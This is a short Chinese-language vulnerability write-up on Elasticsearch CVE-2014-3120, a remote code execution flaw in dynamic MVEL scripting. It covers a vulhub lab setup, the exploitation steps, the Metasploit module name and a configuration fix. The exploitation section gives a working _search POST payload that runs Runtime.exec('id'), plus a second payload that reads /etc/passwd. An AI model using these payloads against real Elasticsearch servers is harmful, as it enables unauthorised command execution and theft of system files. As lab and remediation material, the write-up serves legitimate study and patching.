0x00简介

ElasticSearch：基于开源的全文检索引擎Lucene，是一个实时分布式搜索和分析引擎，支持全文检索，结构化检索(就是咱们平时用的sql语句的形式)和数据分析等。


0x01漏洞描述

Elasticsearch 1.2之前的默认配置启用动态脚本，该脚本允许远程恶意用户通过_search的source参数执行任意MVEL表达式和Java代码。


0x02环境搭建

使用vulhub一键搭建 /vulhub/elasticsearch/CVE-2014-3120

访问IP：9200


0x03漏洞利用

打开burp，抓包，创建一条数据/website/blog/

发送以下payload执行命令

POST /_search?pretty {   "size": 1,   "query": {     "filtered": {       "query": {         "match_all": {         }       }     }   },   "script_fields": {       "command": {           "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"       }    }}

import java.io.*;new java.util.Scanner(new File(\"/etc/passwd\")).useDelimiter(\"\\\\A\").next();

msf里有该模块

use exploit/multi/elasticsearch/script_mvel_rce


0x04漏洞修复

下载最新版本

或在配置文件elasticsearch.yml里设置script.disable_dynamic: true
